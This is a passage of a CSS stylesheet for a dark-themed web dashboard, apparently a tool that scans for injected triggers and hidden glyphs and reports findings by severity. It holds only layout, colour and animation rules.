.stat .sub{font-size:1.02rem;color:var(--muted);} .stat .flag{position:absolute;top:2.3rem;right:2.3rem;font-size:.78rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;padding:.34rem .78rem;border-radius:9px;} .stat.acc .flag{background:rgba(55,214,122,.15);color:var(--green);} .stat.int .flag{background:rgba(55,214,122,.15);color:var(--green);} .stat.int.bad .flag{background:rgba(255,66,87,.17);color:var(--red);}
.stat .delta{margin-top:.7rem;font-size:.95rem;color:var(--red);font-family:var(--mono);}
.caption{display:flex;align-items:center;gap:1rem;color:var(--faint);font-size:.98rem;margin:1.5rem 0 2.4rem;} .caption .tok{font-family:var(--mono);color:var(--muted);font-size:.9rem;background:var(--surface);border:1px solid var(--line);border-radius:8px;padding:.25rem .6rem;}
.cols{display:grid;grid-template-columns:1fr;gap:1.6rem;}
.panel{background:var(--surface);border:1px solid var(--line);border-radius:22px;padding:2rem 2.1rem;}
#v-bench .panel{margin-bottom:1.6rem;}
.peyebrow{font-size:.8rem;font-weight:700;letter-spacing:.16em;text-transform:uppercase;color:var(--faint);margin-bottom:1.5rem;}
.trigrow{font-size:1rem;color:var(--muted);margin-bottom:1.6rem;line-height:1.7;} .trigrow .code{font-family:var(--mono);font-size:.9rem;color:var(--red);background:var(--surface2);border:1px solid var(--line2);border-radius:8px;padding:.16rem .5rem;} .trigrow b{color:var(--text);font-weight:600;}
.trigrow .mechnote{font-size:.84rem;color:var(--faint);line-height:1.55;margin-top:.6rem;padding-left:.8rem;border-left:2px solid var(--line2);} .trigrow .mechnote b{color:var(--muted);font-weight:600;}
.injdone{display:flex;align-items:center;flex-wrap:wrap;gap:.5rem .6rem;font-size:.94rem;color:var(--muted);margin:.2rem 0 .4rem;} .injdone .ok{display:inline-flex;align-items:center;justify-content:center;width:1.15rem;height:1.15rem;border-radius:50%;background:rgba(55,214,122,.16);color:var(--green);font-size:.72rem;font-weight:800;} .injdone b{color:var(--text);font-weight:600;}
.injmore{margin-left:auto;background:none;border:none;color:var(--red);font:inherit;font-size:.9rem;cursor:pointer;padding:.1rem .1rem;border-radius:6px;} .injmore:hover{text-decoration:underline;}
.hidglyph{background:rgba(255,66,87,.22);color:var(--red);border-radius:3px;padding:0 2px;} .normline{font-size:.94rem;line-height:1.7;margin:.25rem 0;} .normline .nl{display:inline-block;width:88px;color:var(--faint);font-size:.82rem;vertical-align:top;} .normline .nv{font-family:var(--mono);font-size:.9rem;}
.rpfilters{display:flex;gap:.4rem;margin:.2rem 0 .5rem;flex-wrap:wrap;} .rowpick{max-height:220px;overflow-y:auto;border:1px solid var(--line);border-radius:10px;margin:0 0 1rem;background:#0c0e14;} .rprow{display:flex;gap:.7rem;align-items:flex-start;padding:.55rem .8rem;border-bottom:1px solid var(--line);cursor:pointer;} .rprow:last-child{border-bottom:none;} .rprow:hover{background:rgba(255,255,255,.035);} .rprow .rpbadges{display:flex;flex-direction:column;gap:.22rem;flex-shrink:0;width:66px;} .rprow .rptext{font-size:.9rem;color:var(--muted);line-height:1.45;overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;}
.fixgatecard{border:1px solid var(--line);border-radius:14px;padding:1.2rem 1.4rem;margin:.4rem 0 1.2rem;background:#0f1118;transition:border-color .25s,background .25s;} .fixgatecard.ok{border-color:rgba(55,214,122,.4);background:rgba(55,214,122,.05);} .fixgatecard.bad{border-color:rgba(255,66,87,.42);background:rgba(255,66,87,.06);}
.fixtag{display:inline-block;font-size:.9rem;font-weight:800;letter-spacing:.06em;padding:.3rem .75rem;border-radius:8px;margin-bottom:.8rem;} .fixtag.ok{background:rgba(55,214,122,.16);color:var(--green);} .fixtag.bad{background:rgba(255,66,87,.17);color:var(--red);}
.fixmetric{display:flex;align-items:baseline;gap:.7rem;margin:.4rem 0;flex-wrap:wrap;} .fixmetric .fml{flex:1;min-width:180px;font-size:.9rem;color:var(--muted);} .fixmetric .fmv{font-family:var(--mono);font-size:1.15rem;font-weight:700;color:var(--text);min-width:64px;text-align:right;} .fixmetric .fmp{font-size:.82rem;font-weight:700;} .fixmetric .fmp.ok{color:var(--green);} .fixmetric .fmp.bad{color:var(--red);}
.fixsteps{display:flex;gap:.6rem;flex-wrap:wrap;margin:.2rem 0 1rem;} .fixstep{background:var(--surface2);border:1px solid var(--line2);border-radius:10px;color:var(--muted);font:inherit;font-size:.92rem;padding:.6rem .9rem;cursor:pointer;transition:border-color .15s,color .15s,background .15s;} .fixstep b{color:var(--faint);margin-right:.35rem;} .fixstep:hover{border-color:var(--muted);} .fixstep.done{color:var(--text);border-color:var(--line2);} .fixstep.done b{color:var(--green);} .fixstep.active{border-color:var(--red);color:var(--text);}
.fixaudit{border:1px solid var(--line);border-radius:12px;padding:1.1rem 1.3rem;margin:0 0 1rem;background:#0c0e14;} .fixaudit .fahead{font-size:.8rem;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:var(--faint);margin-bottom:.7rem;} .fixaudit .fatoken{font-size:.96rem;color:var(--muted);line-height:1.6;margin-bottom:.8rem;} .fixaudit .farow{display:flex;gap:.7rem;align-items:baseline;padding:.4rem 0;border-top:1px solid var(--line);} .fixaudit .fatext{flex:1;font-size:.88rem;color:var(--muted);} .fixnote{font-size:.92rem;color:var(--muted);line-height:1.6;}
.collcta{margin-top:1.2rem;padding:1.4rem 1.6rem;border:1px solid var(--line2);border-radius:14px;background:linear-gradient(180deg,#12141c,#0f1118);display:flex;justify-content:space-between;align-items:center;gap:1.2rem;flex-wrap:wrap;} .collcta .cctatitle{font-weight:600;color:var(--text);margin-bottom:.28rem;} .collcta .cctasub{font-size:.9rem;color:var(--muted);line-height:1.55;max-width:640px;}
.gfixlead{font-size:.95rem;color:var(--muted);line-height:1.6;margin:.2rem 0 1rem;max-width:760px;} .gfixgrid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:.8rem;margin-bottom:1.2rem;} .gfixcard{border:1px solid var(--line);border-radius:12px;padding:1rem 1.1rem;background:#0f1118;} .gfixcard>b{display:block;color:var(--text);font-weight:600;margin-bottom:.35rem;} .gfixcard span{font-size:.88rem;color:var(--muted);line-height:1.5;} .gfixcard span b{color:var(--text);}
.row{display:flex;gap:.75rem;align-items:center;} .row .n{width:92px;text-align:center;font-variant-numeric:tabular-nums;} .gap{height:1.4rem;}
.bbtn{font-family:var(--disp);font-size:1rem;font-weight:600;border:0;border-radius:12px;padding:.78rem 1.4rem;cursor:pointer;} .bbtn.a{background:var(--red);color:#fff;} .bbtn.g{background:transparent;border:1px solid var(--line2);color:var(--muted);}
.meter{margin-top:1.8rem;} .mx{display:flex;justify-content:space-between;font-size:1rem;color:var(--faint);margin-bottom:1.3rem;} .track{position:relative;height:92px;border-radius:18px;background:linear-gradient(90deg,rgba(55,214,122,.10),transparent 36%,transparent 64%,rgba(255,66,87,.13));border:1px solid var(--line2);} .track .mid{position:absolute;left:50%;top:-7px;bottom:-7px;width:1px;background:var(--line2);}
.dot{position:absolute;width:30px;height:30px;border-radius:50%;transform:translate(-50%,-50%);border:3px solid var(--bg);transition:left .5s cubic-bezier(.2,.8,.2,1);} .dot.c{top:30%;background:var(--green);box-shadow:0 0 0 7px rgba(55,214,122,.14);} .dot.p{top:70%;background:var(--red);box-shadow:0 0 0 7px rgba(255,66,87,.16);}
.dot .tag{position:absolute;left:50%;transform:translateX(-50%);font-size:.72rem;font-weight:700;letter-spacing:.03em;text-transform:uppercase;white-space:nowrap;color:var(--muted);} .dot.c .tag{bottom:calc(100% + 6px);} .dot.p .tag{top:calc(100% + 6px);}
.leg{display:flex;gap:2.2rem;margin-top:1.7rem;font-size:1.08rem;color:var(--muted);} .leg b{color:var(--text);font-weight:600;} .leg .sw{display:inline-block;width:13px;height:13px;border-radius:50%;margin-right:.55rem;}
.trendleg{display:flex;gap:2rem;flex-wrap:wrap;margin-top:1rem;font-size:.95rem;color:var(--muted);} .trendleg .sw{display:inline-block;width:11px;height:11px;border-radius:50%;margin-right:.5rem;}
.deflead{font-size:.95rem;color:var(--muted);line-height:1.55;margin:.4rem 0 1.3rem;}
.defgrid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:1rem;} @media(max-width:820px){.defgrid{grid-template-columns:1fr;}}
.defopt{display:flex;flex-direction:column;gap:.5rem;background:var(--surface2);border:1px solid var(--line);border-radius:14px;padding:1.1rem 1.15rem;cursor:pointer;}
.defopt .deftop{display:flex;align-items:center;gap:.7rem;font-size:1rem;}
.ddgrid{display:grid;grid-template-columns:1fr 1fr;gap:2rem;align-items:start;}
.ddcol{min-width:0;}
.ddcol .defgrid{grid-template-columns:1fr;}
.ddcol.l3side{border-right:1px solid var(--line);padding-right:2rem;}
.ddtag{display:inline-block;font-family:var(--mono);font-size:.72rem;letter-spacing:.1em;text-transform:uppercase;padding:.22rem .6rem;border-radius:6px;border:1px solid var(--line2);margin-bottom:.65rem;}
.ddtag.l3{color:var(--green);border-color:rgba(55,214,122,.35);background:rgba(55,214,122,.06);}
.ddtag.l4{color:#4c9aff;border-color:rgba(76,154,255,.35);background:rgba(76,154,255,.06);}
.ddsub{font-size:.9rem;color:var(--muted);line-height:1.55;margin-bottom:1.1rem;}
@media(max-width:900px){.ddgrid{grid-template-columns:1fr;gap:2.4rem;}.ddcol.l3side{border-right:0;padding-right:0;border-bottom:1px solid var(--line);padding-bottom:2rem;}} .defopt .deftop b{font-weight:600;}
.defopt .defd{font-size:.88rem;color:var(--faint);line-height:1.5;}
.fired{margin-top:1.4rem;font-size:1rem;color:var(--muted);min-height:1.3rem;} .fired.on{color:var(--red);font-weight:500;}
.verdict{margin-top:1.6rem;background:var(--surface);border:1px solid var(--line);border-radius:22px;padding:2rem 2.1rem 1.7rem;}
.gate{display:flex;align-items:center;justify-content:space-between;padding:1.15rem .1rem;border-bottom:1px solid var(--line);} .gate:last-of-type{border-bottom:none;} .gate .gl{font-size:1.12rem;font-weight:600;} .gate .gd{font-size:.88rem;color:var(--faint);margin-top:.2rem;} .gate .thr{font-family:var(--mono);font-size:.9rem;color:var(--muted);margin-right:1rem;} .pill{font-size:.78rem;font-weight:700;letter-spacing:.06em;padding:.3rem .82rem;border-radius:9px;} .pill.pass{background:rgba(55,214,122,.14);color:var(--green);} .pill.fail{background:var(--red);color:#fff;}
.ruling{margin-top:1.3rem;font-size:1.05rem;color:var(--muted);line-height:1.6;} .ruling b{color:var(--text);}
.hstep{display:flex;align-items:center;gap:.8rem;margin:2rem 0 .9rem;} .hstep:first-of-type{margin-top:1rem;}
.hverdict{border-radius:20px;padding:1.7rem 1.9rem;margin:1.4rem 0 1.9rem;border:1px solid var(--line2);background:var(--surface);}
.hverdict.bad{background:radial-gradient(120% 140% at 100% 0%,#33131c,#12131b);border-color:var(--red-ln);}
.hverdict .hvhead{display:flex;align-items:center;gap:.9rem;flex-wrap:wrap;margin-bottom:1.1rem;}
.hverdict .hvtag{font-size:.74rem;font-weight:700;letter-spacing:.11em;padding:.32rem .72rem;border-radius:8px;} .hverdict .hvtag.bad{background:var(--red);color:#fff;} .hverdict .hvtag.ok{background:rgba(55,214,122,.16);color:var(--green);}
.hverdict .hvpills{display:flex;gap:.5rem;flex-wrap:wrap;}
.hverdict .hvstats{display:flex;flex-wrap:wrap;gap:1.1rem 2.4rem;margin:0 0 1.2rem;}
.hverdict .hvs{display:flex;flex-direction:column;gap:.28rem;} .hverdict .hvsl{font-size:.7rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--faint);} .hverdict .hvsv{font-size:1.04rem;font-weight:600;color:var(--text);}
.hverdict .hvbig{font-size:1.02rem;font-weight:400;color:var(--muted);line-height:1.55;} .hverdict .hvbig b{color:var(--text);font-weight:600;}
.hsec{border:1px solid var(--line);border-radius:16px;margin-bottom:.9rem;overflow:hidden;}
.hsechead{display:flex;align-items:center;gap:.95rem;padding:1.15rem 1.4rem;cursor:pointer;transition:background .15s;} .hsechead:hover{background:var(--surface);}
.hsechead .hnum{width:26px;height:26px;flex:none;border-radius:50%;background:var(--surface2);border:1px solid var(--line2);color:var(--muted);font-family:var(--mono);font-size:.85rem;display:flex;align-items:center;justify-content:center;}
.hsechead .hsectitle{flex:1;min-width:0;font-size:1.1rem;font-weight:600;} .hsechead .hsectitle .hsectip{font-size:.85rem;font-weight:400;color:var(--faint);margin-top:.12rem;}
.hsechead .hsecsum{font-size:.92rem;color:var(--muted);text-align:right;} .hsechead .hsecsum b{color:var(--text);font-variant-numeric:tabular-nums;}
.hsechead .fchev{flex:none;color:var(--muted);font-size:1.15rem;width:18px;text-align:center;}
.hsecbody{padding:0 1.4rem 1.4rem;border-top:1px solid var(--line);padding-top:1.3rem;}
.hxpl{font-size:.92rem;color:var(--muted);line-height:1.55;margin-top:1rem;} .hxpl b{color:var(--text);}
.mono{font-family:var(--mono);}
.hgrow{border-bottom:1px solid var(--line);padding:.9rem .1rem;} .hgrow:last-child{border-bottom:none;}
.hgrow .hgk{font-family:var(--mono);font-size:.76rem;color:var(--red);letter-spacing:.02em;} .hgrow .hgk .hgl{color:var(--faint);}
.hgrow .hgren{font-size:1.02rem;color:var(--text);margin:.35rem 0;} .hgrow .hgren .hgtag{font-size:.7rem;color:var(--faint);font-style:italic;margin-left:.4rem;}
.hgrow .hgesc{font-family:var(--mono);font-size:.82rem;color:var(--muted);word-break:break-all;}
.hgempty{color:var(--faint);font-size:.95rem;padding:.5rem 0;}
.hgnote{font-size:.92rem;color:var(--muted);line-height:1.55;margin-bottom:1rem;} .hgnote b{color:var(--text);}
.hgtokrow{display:flex;justify-content:space-between;align-items:baseline;gap:1rem;padding:.55rem .1rem;border-bottom:1px solid var(--line);} .hgtokrow:last-child{border-bottom:none;} .hgtokrow.uni{background:rgba(255,66,87,.05);border-radius:6px;padding-left:.5rem;padding-right:.5rem;}
.hgtokrow .hgtoktok{font-size:.95rem;color:var(--text);word-break:break-all;} .hgtokrow .hgtokmeta{flex:none;font-size:.85rem;color:var(--muted);font-variant-numeric:tabular-nums;}
.hyg-blind{background:var(--surface);border:1px solid var(--line);border-radius:16px;padding:1.3rem 1.5rem;margin-top:1.4rem;}
.hstep .hnum{width:28px;height:28px;flex:none;border-radius:50%;background:var(--surface2);border:1px solid var(--line2);color:var(--muted);font-family:var(--mono);font-size:.9rem;font-weight:600;display:flex;align-items:center;justify-content:center;}
.hstep .htitle{font-size:1.12rem;font-weight:600;letter-spacing:-.01em;}
.invc{padding:1.15rem .2rem;border-bottom:1px solid var(--line);} .invc:last-child{border-bottom:none;}
.invc .invk{font-family:var(--mono);font-size:.8rem;color:var(--faint);} .invc .invt{font-size:1.05rem;font-weight:600;margin:.3rem 0 .35rem;} .invc .invt{font-variant-numeric:tabular-nums;} .invc .invd{color:var(--muted);font-size:.92rem;line-height:1.5;}
.hcmd{display:flex;align-items:center;gap:.8rem;background:var(--surface2);border:1px solid var(--line2);border-radius:12px;padding:.7rem .9rem;margin-bottom:1.3rem;} .hcmd code{font-family:var(--mono);font-size:.9rem;color:var(--text);flex:1;overflow-x:auto;white-space:nowrap;}
.cbtn{font-family:var(--disp);font-size:.82rem;font-weight:600;color:var(--muted);background:transparent;border:1px solid var(--line2);border-radius:8px;padding:.35rem .7rem;cursor:pointer;flex:none;} .cbtn:hover{color:var(--text);border-color:var(--faint);}
.htabs{display:flex;gap:.4rem;margin-bottom:.7rem;} .htab{font-family:var(--mono);font-size:.85rem;color:var(--faint);background:transparent;border:1px solid transparent;border-radius:8px;padding:.35rem .8rem;cursor:pointer;} .htab.on{color:var(--text);background:var(--surface2);border-color:var(--line2);}
.hcode{font-family:var(--mono);font-size:.82rem;line-height:1.6;color:var(--muted);background:var(--surface2);border:1px solid var(--line2);border-radius:12px;padding:1.1rem 1.2rem;overflow-x:auto;white-space:pre;max-height:340px;margin:0 0 1.3rem;}
.hactions{display:flex;align-items:center;gap:.8rem;flex-wrap:wrap;} .hactions .hnote{color:var(--faint);font-size:.9rem;} .hactions .hnote code{font-family:var(--mono);color:var(--muted);}
.weakcard{border-radius:22px;padding:2rem 2.2rem;margin:1.4rem 0 .5rem;background:radial-gradient(120% 140% at 100% 0%,#33131c,#1c0b11);border:1px solid var(--red-ln);}
.weakcard .wl{font-size:.82rem;font-weight:700;letter-spacing:.14em;text-transform:uppercase;color:var(--red);}
.weakcard .wbig{font-size:1.55rem;font-weight:600;letter-spacing:-.015em;margin:.5rem 0 .3rem;line-height:1.3;} .weakcard .wbig b{color:var(--red);}
.weakcard .wsub{color:var(--muted);font-size:1rem;} .weakcard .wbtn{margin-top:1.4rem;}
.sev{font-size:.72rem;font-weight:700;letter-spacing:.06em;text-transform:uppercase;padding:.26rem .66rem;border-radius:8px;white-space:nowrap;}
.sev.critical{background:var(--red);color:#fff;} .sev.high{background:rgba(255,66,87,.18);color:var(--red);} .sev.medium{background:rgba(224,162,58,.18);color:#e0a23a;} .sev.low{background:rgba(139,144,162,.15);color:var(--muted);}
.sevsummary{display:flex;gap:.6rem;flex-wrap:wrap;align-items:center;margin:1.4rem 0 2rem;padding-bottom:1.5rem;border-bottom:1px solid var(--line);}
.sevtally{font-family:var(--mono);font-size:.8rem;color:var(--muted);display:flex;align-items:center;gap:.42rem;padding:.32rem .72rem;border:1px solid var(--line);border-radius:8px;text-transform:capitalize;}
.sevtally b{color:var(--text);font-weight:700;}
.sevtally::before{content:"";width:9px;height:9px;border-radius:50%;background:var(--muted);}
.sevtally.critical::before{background:var(--red);} .sevtally.high::before{background:#ff8f6b;} .sevtally.medium::before{background:#e0a23a;} .sevtally.low::before{background:#8b90a2;}
.fghead{display:flex;align-items:center;gap:.9rem;margin:1.7rem 0 .8rem;} .fghead:first-child{margin-top:.5rem;}
.fghead .fgt{min-width:0;} .fghead .fgtitle{font-size:1.15rem;font-weight:600;letter-spacing:-.01em;} .fghead .fgdesc{font-size:.9rem;color:var(--faint);margin-top:.15rem;}
.fcard{display:flex;align-items:center;gap:1.3rem;background:var(--surface);border:1px solid var(--line);border-radius:16px;padding:1.15rem 1.4rem;margin-bottom:.8rem;margin-left:1.4rem;cursor:pointer;transition:border-color .15s;}
.fcard:hover{border-color:var(--line2);}
.fcard .fchev{flex:none;color:var(--muted);font-size:1.35rem;line-height:1;width:20px;text-align:center;transition:color .15s;} .fcard:hover .fchev{color:var(--text);}
.fdetail{margin:-.5rem 1.4rem .9rem 1.4rem;background:var(--surface2);border:1px solid var(--line);border-radius:14px;padding:1.3rem 1.4rem 1.2rem;}
.fdetail .fx-axis{font-size:.8rem;color:var(--faint);text-align:center;margin-bottom:.5rem;}
.fdetail .fxpl{font-size:.92rem;color:var(--muted);line-height:1.55;margin-top:1rem;} .fdetail .fxpl b{color:var(--text);}
.fcard .fmain{flex:1;min-width:0;} .fcard .ftitle{font-size:1.08rem;font-weight:600;} .fcard .fmeta{font-size:.9rem;color:var(--muted);margin-top:.25rem;} .fcard .fmeta b{color:var(--text);font-variant-numeric:tabular-nums;}
.fcard .fspark{flex:none;} .fcard .fbtn{flex:none;}
.scan-note{color:var(--faint);font-size:.88rem;margin-top:1.3rem;line-height:1.5;} .scan-note .code{font-family:var(--mono);font-size:.82rem;color:var(--muted);}
.scanexport{display:flex;gap:.6rem;flex-wrap:wrap;margin-top:2rem;padding-top:1.6rem;border-top:1px solid var(--line);}
.scandefend{margin:2.2rem 0 .4rem;padding:1.5rem 1.7rem;border:1px solid var(--line2);border-radius:18px;background:linear-gradient(180deg,rgba(255,66,87,.06),transparent 70%);}
.scandefend .sdh{font-family:var(--disp);font-size:1.2rem;font-weight:700;color:var(--text);margin-bottom:.5rem;}
.scandefend .sdt{font-size:.96rem;color:var(--muted);line-height:1.6;margin-bottom:1.2rem;} .scandefend .sdt b{color:var(--text);}
.scandefend .sdbtns{display:flex;gap:.8rem;flex-wrap:wrap;}
.gtabs{display:flex;gap:.4rem;margin:1.4rem 0 0;} .gtab{font-family:var(--mono);font-size:.82rem;color:var(--faint);background:none;border:1px solid transparent;border-bottom:none;border-radius:8px 8px 0 0;padding:.5rem .9rem;cursor:pointer;} .gtab.on{color:var(--text);background:var(--surface2);border-color:var(--line2);}
.gfilebar{display:flex;align-items:center;justify-content:space-between;gap:.8rem;background:var(--surface2);border:1px solid var(--line2);border-radius:0 10px 0 0;padding:.5rem .8rem;flex-wrap:wrap;} .gfilebar .gfname{font-family:var(--mono);font-size:.82rem;color:var(--muted);} .gfilebar .gfacts{display:flex;gap:.5rem;} .gfilebar .bbtn{font-size:.82rem;padding:.35rem .8rem;}
.gfile{font-family:var(--mono);font-size:.82rem;line-height:1.55;color:var(--text);background:var(--surface2);border:1px solid var(--line2);border-top:none;border-radius:0 0 10px 10px;padding:1rem 1.1rem;overflow-x:auto;white-space:pre;max-height:32rem;overflow-y:auto;margin:0;}
.ginv{display:flex;gap:.7rem;align-items:flex-start;padding:.7rem 0;border-bottom:1px solid var(--line);} .ginv:last-child{border-bottom:none;} .ginv .gitype{font-family:var(--mono);font-size:.72rem;color:var(--red);background:rgba(255,66,87,.12);border-radius:6px;padding:.2rem .5rem;white-space:nowrap;flex:none;margin-top:.1rem;} .ginv .gidesc{font-size:.92rem;color:var(--muted);line-height:1.5;} .ginv .gidesc b{color:var(--text);}
.drop{border:1.5px dashed var(--line2);border-radius:18px;padding:2.6rem 2rem;text-align:center;cursor:pointer;transition:border-color .15s,background .15s;} .drop:hover{border-color:var(--red);background:rgba(255,66,87,.03);}
.drop .dh{font-size:1.3rem;font-weight:600;} .drop .dd{color:var(--muted);margin-top:.5rem;font-size:.98rem;}
.hfrow{display:flex;gap:.6rem;margin-top:1rem;} .hfrow input{flex:1;background:var(--surface2);border:1px solid var(--line2);border-radius:12px;padding:.7rem .9rem;color:var(--text);font-family:var(--disp);}
.ordemo{color:var(--faint);font-size:.82rem;margin:1.8rem 0 1rem;text-transform:uppercase;letter-spacing:.12em;}
.localonly{display:none;align-items:center;gap:.35rem;margin-left:.55rem;padding:.14rem .55rem;border:1px solid var(--line2);border-radius:999px;background:var(--surface2);color:var(--muted);font-size:.68rem;font-weight:700;text-transform:uppercase;letter-spacing:.1em;vertical-align:middle;}
html.demo .localonly{display:inline-flex;}
.err{color:var(--red);margin-top:1.1rem;font-size:.95rem;min-height:1rem;}
.loading{position:fixed;inset:0;background:rgba(7,8,16,.88);display:none;align-items:center;justify-content:center;flex-direction:column;gap:1.3rem;z-index:99;} .loading.on{display:flex;}
.spin{width:38px;height:38px;border-radius:50%;border:3px solid var(--line2);border-top-color:var(--red);animation:spin .8s linear infinite;} @keyframes spin{to{transform:rotate(360deg);}}
.spin.sm{width:16px;height:16px;border-width:2px;display:inline-block;vertical-align:-2px;margin-right:.55rem;}
.scanbox{background:var(--surface);border:1px solid var(--line);border-radius:18px;padding:1.7rem 2rem;min-width:min(380px,86vw);box-shadow:0 24px 60px rgba(0,0,0,.5);}
.scanttl{font-size:1.05rem;font-weight:600;color:var(--text);margin-bottom:1.2rem;display:flex;align-items:center;}
.sstep{display:flex;align-items:center;gap:.7rem;padding:.42rem 0;color:var(--faint);font-size:.95rem;opacity:.55;transition:opacity .35s ease,color .35s ease;}
.sstep.on{opacity:1;color:var(--muted);}
.sstep.done{opacity:1;color:var(--text);}
.sstep .sdot{width:17px;height:17px;border-radius:50%;border:2px solid var(--line2);flex:none;position:relative;transition:all .3s ease;}
.sstep.on .sdot{border-color:var(--red);}
.sstep.done .sdot{border-color:var(--green);background:var(--green);box-shadow:0 0 9px rgba(55,214,122,.45);}
.sstep.done .sdot::after{content:"";position:absolute;left:4.5px;top:1px;width:4px;height:8px;border:solid var(--surface);border-width:0 2px 2px 0;transform:rotate(45deg);}
.loading .lt{color:var(--muted);font-family:var(--mono);font-size:.98rem;}
.tip{position:fixed;display:none;max-width:300px;background:var(--surface);border:1px solid var(--line2);border-radius:11px;padding:.65rem .8rem;font-size:.88rem;line-height:1.45;color:var(--text);pointer-events:none;z-index:60;box-shadow:0 10px 30px rgba(0,0,0,.5);}
.tip .tl{font-family:var(--mono);font-size:.72rem;font-weight:700;text-transform:uppercase;letter-spacing:.08em;margin-bottom:.35rem;}
.inj{position:fixed;inset:0;background:rgba(7,8,16,.93);display:none;align-items:center;justify-content:center;z-index:100;}
.inj.on{display:flex;animation:fade .25s ease both;}
.injbox{width:min(700px,92vw);background:var(--surface);border:1px solid var(--line2);border-radius:20px;padding:1.7rem 1.9rem 1.8rem;box-shadow:0 30px 90px rgba(0,0,0,.55);}
.inspect{position:fixed;inset:0;z-index:130;display:none;align-items:center;justify-content:center;padding:3.5vh 2vw;}
.inspect.on{display:flex;}
.insbackdrop{position:absolute;inset:0;background:rgba(7,8,16,.9);}
.insbox{position:relative;width:min(1080px,96vw);max-height:93vh;display:flex;flex-direction:column;background:var(--surface);border:1px solid var(--line2);border-radius:20px;padding:1.6rem 1.7rem;box-shadow:0 30px 90px rgba(0,0,0,.6);}
.inshead{display:flex;justify-content:space-between;align-items:flex-start;gap:1rem;margin-bottom:1.1rem;}
.insttl{font-size:1.3rem;font-weight:600;letter-spacing:-.02em;}
.inssub{font-size:.9rem;color:var(--muted);margin-top:.3rem;}
.insclose{background:none;border:0;color:var(--faint);font-size:1.7rem;line-height:1;cursor:pointer;padding:0 .2rem;}
.insclose:hover{color:var(--text);}
/* onboarding tour */
.tour{position:fixed;inset:0;z-index:140;display:none;align-items:center;justify-content:center;padding:3vh 2vw;overflow:hidden;}
.tour.on{display:flex;animation:tourveil .35s ease both;}@keyframes tourveil{from{opacity:0}to{opacity:1}}
.tourback{position:absolute;inset:0;background:radial-gradient(circle at 18% 15%,rgba(163,230,53,.07),transparent 24%),radial-gradient(circle at 82% 72%,rgba(255,66,87,.14),transparent 32%),rgba(3,4,8,.92);backdrop-filter:blur(10px);}
.tourback::after{content:"";position:absolute;inset:0;opacity:.18;background-image:linear-gradient(rgba(255,255,255,.04) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.04) 1px,transparent 1px);background-size:52px 52px;animation:storygrid 18s linear infinite;}@keyframes storygrid{to{transform:translate(52px,52px)}}
.tourbox{position:relative;width:min(940px,95vw);min-height:min(650px,92vh);display:flex;flex-direction:column;background:linear-gradient(145deg,rgba(16,18,27,.98),rgba(7,8,13,.99));border:1px solid #303443;border-radius:26px;padding:1.25rem 1.4rem 1.3rem;box-shadow:0 45px 140px rgba(0,0,0,.72),0 0 0 8px rgba(255,255,255,.012);overflow:hidden;}
.tourbox::before{content:"";position:absolute;right:-160px;top:-180px;width:450px;height:450px;border-radius:50%;background:rgba(255,66,87,.09);filter:blur(35px);pointer-events:none;}
.tourtop{position:relative;z-index:2;display:flex;justify-content:space-between;align-items:center;gap:1rem;margin-bottom:.85rem;}
.tourbrand{display:flex;align-items:center;gap:.75rem;}.tourbrandmark{display:grid;place-items:center;width:28px;height:28px;border:1px solid var(--red-ln);border-radius:9px;background:rgba(255,66,87,.1);color:var(--red);font-family:var(--mono);font-size:.8rem;box-shadow:0 0 18px rgba(255,66,87,.1);}.toureye{font-family:var(--mono);font-size:.66rem;letter-spacing:.13em;text-transform:uppercase;color:var(--muted);}.toureye b{display:block;color:var(--text);font-size:.72rem;margin-bottom:.05rem;}
.tourtools{display:flex;align-items:center;gap:.45rem;}.tourtime{font-family:var(--mono);font-size:.68rem;color:var(--faint);min-width:76px;text-align:right;}.tourplay,.tourskip{display:grid;place-items:center;height:32px;border:1px solid var(--line2);border-radius:9px;background:rgba(15,17,25,.76);color:var(--muted);font:600 .72rem var(--disp);cursor:pointer;padding:0 .65rem;transition:color .15s,border-color .15s,background .15s;}.tourplay:hover,.tourskip:hover{color:var(--text);border-color:#3b4052;background:var(--surface);}.tourskip{font-size:1.05rem;width:32px;padding:0;}
.tdots{position:relative;z-index:2;display:grid;grid-template-columns:repeat(4,1fr);gap:.42rem;margin-bottom:.9rem;}.tdots button{position:relative;height:4px;padding:0;border:0;border-radius:99px;background:var(--line2);overflow:hidden;cursor:pointer;}.tdots button span{display:block;height:100%;width:0;background:var(--red);border-radius:inherit;box-shadow:0 0 10px rgba(255,66,87,.45);}.tdots button.done span{width:100%;background:var(--muted);box-shadow:none;}
.tourview{position:relative;z-index:1;flex:1;min-height:430px;display:flex;}
.tslide{display:none;width:100%;min-width:0;grid-template-columns:minmax(0,.88fr) minmax(0,1.12fr);gap:2.4rem;align-items:center;padding:1.5rem 1rem 1rem;}
.tslide.on{display:grid;animation:storyin .55s cubic-bezier(.2,.75,.15,1) both;}@keyframes storyin{from{opacity:0;transform:translateY(15px) scale(.99)}to{opacity:1;transform:none}}
.story-copy{min-width:0;}.tstep{display:flex;align-items:center;gap:.55rem;font-family:var(--mono);font-size:.66rem;font-weight:700;letter-spacing:.13em;text-transform:uppercase;color:var(--red);margin-bottom:.8rem;}.tstep::before{content:"";width:22px;height:1px;background:var(--red);}.ttl{font-size:clamp(2rem,4vw,3.55rem);font-weight:600;line-height:1.02;letter-spacing:-.048em;margin:0 0 .85rem;}.ttl .hot{color:var(--red);}.tbody{color:var(--muted);font-size:1rem;line-height:1.62;margin:0;max-width:440px;}.tbody b{color:var(--text);font-weight:600;}
.story-scene{position:relative;min-width:0;min-height:340px;display:flex;align-items:center;justify-content:center;border:1px solid var(--line);border-radius:22px;background:linear-gradient(145deg,rgba(12,14,21,.94),rgba(7,8,13,.96));overflow:hidden;}.story-scene::before{content:"";position:absolute;inset:0;opacity:.2;background-image:linear-gradient(rgba(255,255,255,.04) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.04) 1px,transparent 1px);background-size:34px 34px;}
